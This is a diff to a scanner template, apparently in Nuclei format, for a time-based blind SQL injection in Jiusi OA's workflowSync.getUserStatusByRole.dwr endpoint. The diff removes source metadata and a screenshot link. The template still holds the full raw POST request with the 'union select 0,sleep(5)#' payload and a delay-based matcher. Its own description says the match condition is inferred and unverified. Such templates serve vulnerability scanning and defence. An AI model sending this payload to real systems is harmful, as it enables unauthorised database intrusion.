@@ -3,14 +3,8 @@ info:
   name: 九思OA workflowSync.getUserStatusByRole.dwr SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/firwlyg6wre9xgsp
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: firwlyg6wre9xgsp
-    fofa: app="九思软件-OA"
 http:
 - raw:
   - 'POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
@@ -42,9 +36,7 @@ http:
 
     c0-param1=string:1 union select 0,sleep(5)#
 
-    xml=true
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733226561324-807ee158-42e1-4e8a-8b8d-66e3ac5dde28.png)'
+    xml=true'
   redirects: false
   matchers:
   - type: dsl
